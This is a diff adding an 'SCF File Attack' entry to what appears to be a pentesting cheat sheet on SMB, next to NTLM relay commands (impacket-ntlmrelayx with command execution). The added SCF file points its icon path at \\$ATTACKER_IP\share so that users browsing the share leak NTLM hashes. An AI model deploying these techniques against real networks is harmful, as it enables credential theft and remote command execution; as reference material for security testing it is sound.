@@ -202,6 +202,16 @@ cat /etc/responder/Responder.conf | grep 'SMB ='
 ## but we can execute commands by adding the option -c.
 impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP
 impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP -c <command>
+
+# SCF File Attack
+## Start responder
+## Create an scf file and upload it on
+## smb server
+[Shell]
+Command=2
+IconFile=\\$ATTACKER_IP\share\blahblah
+[Taskbar]
+Command=ToggleDesktop
 ```
 
 ## NFS
